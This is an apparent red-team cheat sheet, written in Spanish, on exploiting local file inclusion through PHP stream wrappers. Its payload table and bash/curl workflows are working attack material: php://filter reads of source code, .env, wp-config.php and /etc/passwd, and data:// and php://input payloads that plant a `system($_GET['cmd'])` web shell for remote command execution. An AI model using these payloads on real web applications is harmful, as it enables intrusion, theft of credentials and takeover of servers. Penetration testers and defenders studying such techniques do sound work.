---
aliases:
  - Wrappers
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI - PHP Wrappers

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `php://filter/convert.base64-encode/resource=index.php` | Source PHP en base64 (no se ejecuta) | Lectura segura de archivos PHP. NO requiere `allow_url_include`. |
| `php://filter/convert.base64-encode/resource=/var/www/html/.env` | `.env` en base64 — bypasea chars XML/binarios | Lectura genérica de archivos con chars problemáticos. |
| `php://filter/string.rot13/resource=config.php` | Source PHP rot13-encoded | Alt cuando base64 está filtrado por WAF. |
| `php://filter/read=convert.iconv.UTF8.UTF16LE/resource=file.txt` | Charset conversion como evasión adicional | WAF muy estricto. |
| `php://input` (body POST con `<?php system('id'); ?>`) | Ejecuta el body POST como PHP | `allow_url_include=On` + endpoint acepta POST. |
| `data://text/plain,<?php system('id'); ?>` | PHP inline en URI | `allow_url_include=On`. |
| `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` | PHP base64-encoded inline | `allow_url_include=On`. Bypassea filtros de `<?php`. |
| `expect://id` | Ejecuta `id` directo via expect extension | Extension `expect` instalada (raro). |
| `zip:///var/www/uploads/payload.zip%23shell.php` | Incluye `shell.php` dentro de ZIP subido | Combo con upload de ZIP. |
| `phar:///var/www/uploads/payload.phar/index.php` | Incluye + deserializa metadata PHAR | Combo con [[LFI To RCE - Phar Deserialization]]. |
| `file:///etc/passwd` | Wrapper explícito file:// | Alt cuando paths plain están filtrados. |
| `php://filter/convert.iconv.UTF-8.CSISO2022KR\|convert.base64-encode/resource=/etc/passwd` | Iconv chain — base de PHP Filter Chains | Building block para [[LFI To RCE - PHP Filter Chains]]. |
^lfi-wrappers

### Workflow — read source

```bash
TARGET="https://target/?page=PAYLOAD"

# Leer source de la app (no se ejecuta)
PAYLOAD='php://filter/convert.base64-encode/resource=index.php'
B64=$(curl -s "${TARGET//PAYLOAD/$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")}")
echo "$B64" | base64 -d

# Iterar archivos comunes
for f in 'index.php' 'config.php' '.env' 'wp-config.php' 'admin.php'; do
  echo "=== $f ==="
  curl -s "${TARGET//PAYLOAD/php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D$f}" | base64 -d 2>/dev/null | head -20
done
```

### Workflow — RCE via data://

```bash
# 1. Confirmar allow_url_include
PHPINFO_PATH='/etc/php/7.4/apache2/php.ini'
curl -s "${TARGET//PAYLOAD/php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D$PHPINFO_PATH}" | base64 -d | grep allow_url_include

# 2. Si On → payload data://
B64=$(echo -n '<?php system($_GET["cmd"]); ?>' | base64)  # PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
PAYLOAD="data://text/plain;base64,${B64}&cmd=id"
curl -s "${TARGET//PAYLOAD/$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")}"
```

### Workflow — RCE via php://input

```bash
curl -X POST "${TARGET//PAYLOAD/php%3A%2F%2Finput}&cmd=id" \
  --data '<?php system($_GET["cmd"]); ?>'
```

### Requisitos por wrapper

| Wrapper | `allow_url_include` | Otras condiciones |
|:---:|:---:|:---:|
| `php://filter` | No requiere | Siempre disponible. |
| `data://` | **Sí** | Bloqueado en stacks modernos. |
| `php://input` | **Sí** | Endpoint debe aceptar POST. |
| `expect://` | No requiere | Ext `expect` instalada (raro). |
| `zip://` / `phar://` | No requiere | Archivo subido al server. |
| `file://` | No requiere | Equivalente a path plain. |

---

## Overview

PHP stream wrappers permiten acceder a recursos como si fueran archivos. `php://filter` es el más útil — lectura segura de cualquier archivo sin ejecución, incluyendo PHP source.

**Estrategia:**
1. `php://filter/convert.base64-encode/resource=X` para LEER X (no ejecuta).
2. `data://` o `php://input` para EJECUTAR (requiere `allow_url_include=On`).
3. Si `allow_url_include=Off` y necesitás RCE → [[LFI To RCE - PHP Filter Chains]] (sin requisitos), [[LFI To RCE - Log Poisoning]], o [[LFI To RCE - Session File Poisoning]].

---
